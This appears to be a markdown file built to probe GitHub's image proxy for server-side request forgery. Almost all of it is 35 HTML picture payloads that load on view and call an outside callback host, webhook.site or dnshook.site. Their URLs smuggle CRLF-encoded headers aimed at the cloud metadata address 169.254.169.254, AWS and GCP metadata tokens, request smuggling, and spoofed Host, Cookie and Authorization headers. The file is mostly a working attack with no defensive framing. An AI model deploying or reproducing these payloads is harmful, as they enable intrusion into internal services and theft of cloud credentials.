# SSRF v5 - CRLF Injection & Host Header Exploitation

## Key Finding: CRLF characters pass through!
This suggests potential for header/request injection attacks.

## Test 1: Double CRLF - New Request
<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v5/double-crlf%0d%0a%0d%0aGET%20/secret%20HTTP/1.1%0d%0aHost:%20169.254.169.254" media="(min-width: 1px)"><img src="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v5/tracker"></picture>

## Test 2: Host Header Injection
<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v5/host%0d%0aHost:%20localhost" media="(min-width: 1px)"><img src="x"></picture>

## Test 3: X-Forwarded-For Injection
<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v5/xff%0d%0aX-Forwarded-For:%20127.0.0.1" media="(min-width: 1px)"><img src="x"></picture>

## Test 4: X-Real-IP Injection
<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v5/realip%0d%0aX-Real-IP:%20127.0.0.1" media="(min-width: 1px)"><img src="x"></picture>

## Test 5: X-Forwarded-Host Injection
<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v5/fhost%0d%0aX-Forwarded-Host:%20169.254.169.254" media="(min-width: 1px)"><img src="x"></picture>

## Test 6: X-Original-URL Injection
<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v5/xoriginal%0d%0aX-Original-URL:%20http://169.254.169.254/latest" media="(min-width: 1px)"><img src="x"></picture>

## Test 7: X-Rewrite-URL Injection
<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v5/xrewrite%0d%0aX-Rewrite-URL:%20/admin" media="(min-width: 1px)"><img src="x"></picture>

## Test 8: Connection Close Smuggling
<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v5/conn%0d%0aConnection:%20close" media="(min-width: 1px)"><img src="x"></picture>

## Test 9: Content-Length Injection
<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v5/cl%0d%0aContent-Length:%200" media="(min-width: 1px)"><img src="x"></picture>

## Test 10: Transfer-Encoding Injection
<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v5/te%0d%0aTransfer-Encoding:%20chunked" media="(min-width: 1px)"><img src="x"></picture>

## Test 11: AWS Metadata Header
<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v5/aws%0d%0aX-aws-ec2-metadata-token:%20test" media="(min-width: 1px)"><img src="x"></picture>

## Test 12: GCP Metadata Header
<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v5/gcp%0d%0aMetadata-Flavor:%20Google" media="(min-width: 1px)"><img src="x"></picture>

## Test 13: Cookie Injection
<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v5/cookie%0d%0aCookie:%20admin=true" media="(min-width: 1px)"><img src="x"></picture>

## Test 14: Authorization Injection
<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v5/auth%0d%0aAuthorization:%20Bearer%20token" media="(min-width: 1px)"><img src="x"></picture>

## Test 15: Referer Injection
<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v5/referer%0d%0aReferer:%20http://internal.github.com" media="(min-width: 1px)"><img src="x"></picture>

## Test 16: Origin Injection
<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v5/origin%0d%0aOrigin:%20http://localhost" media="(min-width: 1px)"><img src="x"></picture>

## Test 17: LF Only Injection (Linux style)
<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v5/lf%0aHost:%20internal" media="(min-width: 1px)"><img src="x"></picture>

## Test 18: CR Only Injection
<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v5/cr%0dHost:%20internal" media="(min-width: 1px)"><img src="x"></picture>

## Test 19: Unicode Line Separator
<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v5/unicode%E2%80%A8Host:%20internal" media="(min-width: 1px)"><img src="x"></picture>

## Test 20: Unicode Paragraph Separator
<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v5/para%E2%80%A9Host:%20internal" media="(min-width: 1px)"><img src="x"></picture>

## Test 21: Null Byte Termination
<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v5/null%00internal" media="(min-width: 1px)"><img src="x"></picture>

## Test 22: Request Smuggling CL.TE
<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v5/clte%0d%0aContent-Length:%2050%0d%0aTransfer-Encoding:%20chunked" media="(min-width: 1px)"><img src="x"></picture>

## Test 23: Request Smuggling TE.CL
<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v5/tecl%0d%0aTransfer-Encoding:%20chunked%0d%0aContent-Length:%2050" media="(min-width: 1px)"><img src="x"></picture>

## Test 24: Absolute URL in Path
<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v5/%0d%0aGET%20http://169.254.169.254/%20HTTP/1.1" media="(min-width: 1px)"><img src="x"></picture>

## Test 25: Method Override Header
<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v5/method%0d%0aX-HTTP-Method-Override:%20PUT" media="(min-width: 1px)"><img src="x"></picture>

## Test 26: DNS Canary - Webhook Subdomain
<picture><source srcset="https://callback-v5.b45a05ce-3f7d-4a49-9e5d-5a138dde5eca.dnshook.site/v5/dns-canary" media="(min-width: 1px)"><img src="x"></picture>

## Test 27: Encoded CRLF Double
<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v5/%250d%250a%250d%250ainjected" media="(min-width: 1px)"><img src="x"></picture>

## Test 28: Mixed Encoding CRLF
<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v5/%0d%250aHost:%20evil" media="(min-width: 1px)"><img src="x"></picture>

## Test 29: Triple Encoded CRLF
<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v5/%25250d%25250aHeader" media="(min-width: 1px)"><img src="x"></picture>

## Test 30: GitHub Internal Service Names
<picture><source srcset="https://api.github.localhost.b45a05ce-3f7d-4a49-9e5d-5a138dde5eca.dnshook.site/" media="(min-width: 1px)"><img src="x"></picture>

## Test 31: Camo Self-Reference
<picture><source srcset="https://camo.githubusercontent.com.b45a05ce-3f7d-4a49-9e5d-5a138dde5eca.dnshook.site/" media="(min-width: 1px)"><img src="x"></picture>

## Test 32: GitHub Actions Runner
<picture><source srcset="https://actions-runner.github.internal.b45a05ce-3f7d-4a49-9e5d-5a138dde5eca.dnshook.site/" media="(min-width: 1px)"><img src="x"></picture>

## Test 33: Set-Cookie via CRLF
<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v5/setcookie%0d%0aSet-Cookie:%20admin=1" media="(min-width: 1px)"><img src="x"></picture>

## Test 34: Location Header Injection
<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v5/location%0d%0aLocation:%20http://169.254.169.254/" media="(min-width: 1px)"><img src="x"></picture>

## Test 35: HTTP/2 Smuggling Headers
<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v5/h2%0d%0a:path:%20/secret%0d%0a:authority:%20internal" media="(min-width: 1px)"><img src="x"></picture>

---
**v5: CRLF Injection Focus - Testing header injection possibilities**
